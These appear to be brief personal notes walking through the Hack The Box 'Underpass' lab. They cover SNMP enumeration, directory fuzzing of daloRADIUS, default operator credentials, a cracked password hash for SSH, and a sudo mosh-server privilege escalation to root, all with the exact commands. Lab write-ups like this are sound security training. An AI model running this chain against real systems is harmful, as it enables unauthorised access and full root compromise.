## Userflag

ssh scan doesnt show anything since service running is UDP not TCP 

use -sU flag to find services

Port 161 has snmp running. Can use snmp-check (doesnt work on linux mint) so snmpwalk there

snmpwalk -v2c -c public <target>

Got some info but that isnt really useful.

Use dirsearch to fuzz underpass.htb/daloradius

Will find 

http://underpass.htb/daloradius/app/users/login.php

but default creds dont work there. keep fuzzing to find new endpoints

dirsearch -u "http://underpass.htb/daloradius/app/" -t 50 -w /usr/share/wordlists/discovery/directory_list_2.3_medium.txt 

Will get - http://underpass.htb/daloradius/app/operators/

Where default creds work, has one user listed. Find password, get it from crackstation and ssh using username svcMosh (m has to be capital)

Once done u have user flag.

For root run

sudo -l

user can run mosh binary as root. 

Use command

mosh --server="sudo /usr/bin/mosh-server" localhost. Get root shell and flag.


Writeup - https://medium.com/@gifton.ibm/underpass-htb-walkthrough-969fe46cd18a